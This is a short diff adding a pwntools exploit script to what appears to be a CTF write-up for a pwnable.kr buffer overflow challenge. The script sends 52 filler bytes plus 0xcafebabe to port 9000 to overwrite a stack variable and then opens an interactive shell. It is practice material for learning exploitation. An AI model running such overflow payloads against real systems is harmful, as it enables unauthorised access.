@@ -838,3 +838,15 @@ Testing our payload we can see it works:
 pwndbg> x $ebp+8
 0xffffd630:     0x42424242
 ```
+
+<br>
+
+```python
+from pwn import p32, remote
+
+io = remote("pwnable.kr", 9000)
+print(io.read())
+payload = b"A"*52 + p32(0xcafebabe)
+io.sendline(payload)
+io.interactive()
+```
